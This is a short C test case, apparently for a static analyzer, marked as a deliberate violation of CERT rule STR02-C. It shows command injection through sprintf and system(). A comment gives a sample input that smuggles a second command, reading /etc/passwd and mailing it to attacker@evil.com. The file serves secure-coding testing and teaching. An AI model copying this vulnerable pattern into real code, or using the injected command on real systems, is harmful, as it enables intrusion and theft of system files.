/*
 * Rule: STR02-C
 * Source: wiki
 * Status: FAIL - Should trigger STR02-C violation
 *
 * This demonstrates how an attacker-provided address string can
 * lead to command injection via system().
 */

void vulnerable_email(const char *addr) {
    char buffer[512];
    /* addr could be: "bogus@addr.com; cat /etc/passwd | mail attacker@evil.com" */
    sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
    system(buffer);  /* Unsafe: buffer contains user-controlled data */
}
